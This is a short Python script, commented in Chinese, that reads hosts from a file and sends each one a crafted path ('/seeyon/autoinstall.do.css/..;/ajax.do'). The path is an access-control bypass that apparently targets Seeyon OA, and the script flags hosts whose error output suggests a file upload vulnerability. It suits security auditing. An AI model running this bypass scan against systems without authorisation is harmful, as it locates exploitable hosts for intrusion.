# -*- coding: UTF-8 -*-
import requests
from urllib.parse import urlparse
from enum import Enum


headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }

###
###字体颜色处理函数(windows cmd中无效)
###如打印红色文字
###print_color('Hello World', fg = Color.RED.value)
###

class Color(Enum):
    BLACK = 30
    RED = 31
    GREEN = 32
    YELLOW = 33
    BLUE = 34
    MAGENTA = 35
    CYAN = 36
    WHITE = 37
def print_color(text: str, fg: Color = Color.BLACK.value):
    print(f'\033[{fg}m{text}\033[0m')

###
###url检测函数
###需根据情况自行构造，如检测漏洞页面是否存在等操作,windows cmd下建议注释print_color函数，自行修改输出
###check_url(url)
###


def check_url(url):
    print ("check_url: "+url)
    try:
        req=requests.get(url=url,headers=headers,verify=False,timeout=10)
        if "java.lang.NullPointerException:nul" in req.text:
            print("[success]存在文件上传漏洞")
        else:
            print("[error]不存在文件上传漏洞")
    except Exception as e:
        print("[error]不存在文件上传漏洞")
        pass

###
###url处理函数
###从ip:port、http://ip:port、https://domain:port/path/xx.html等不同格式转化为 协议+ip/domain+port格式
###read_url
###


def read_url():
    f = open("urls.txt", 'r')
    for line in f.readlines():
        target = line.strip()
        #print(target)
        if "http" not in line:
            target="http://"+target
        target=urlparse(target.strip())
        #print(target)
        url = target.scheme+"://"+target.netloc+"/seeyon/autoinstall.do.css/..;/ajax.do"
        print(url)
        #拼接成需要的格式
        
        check_url(url)


def main():
    read_url()

main()
